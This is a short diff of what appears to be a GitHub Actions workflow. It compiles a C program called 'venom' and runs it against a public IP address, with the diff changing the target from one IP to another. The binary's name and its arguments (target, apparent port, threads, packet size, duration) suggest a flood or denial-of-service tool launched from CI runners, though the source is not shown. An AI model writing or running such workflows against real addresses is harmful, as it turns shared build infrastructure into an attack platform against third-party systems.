@@ -23,4 +23,4 @@ jobs:
         run: gcc -O2 -Wall -pthread -march=native -o venom m.c
 
       - name: Run executable
-        run: ./venom 23.237.205.26 22 100 400 1024 128
+        run: ./venom 35.194.110.104 100 400 1024 128
